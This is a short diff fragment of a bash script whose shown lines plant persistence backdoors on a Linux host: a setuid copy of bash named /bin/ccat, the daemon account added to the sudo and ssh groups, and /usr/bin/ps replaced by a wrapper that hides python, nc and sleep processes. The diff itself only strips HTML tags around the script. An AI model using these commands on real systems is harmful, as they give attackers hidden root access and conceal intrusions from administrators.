@@ -1,5 +1,3 @@
-<pre>
-  <code>
 #!/bin/bash
 cp /bin/bash /bin/ccat
 chmod u+s /bin/ccat
@@ -67,6 +65,3 @@ usermod -G sudo,ssh daemon
 
 #Copy ps -auxf 
 mv /usr/bin/ps /usr/bin/psnt; echo '/usr/bin/psnt | grep -ve "python" -e "nc" -e "sleep" -e "grep"' > /usr/bin/ps; chmod +x /usr/bin/ps
-
-</code>
-</pre>
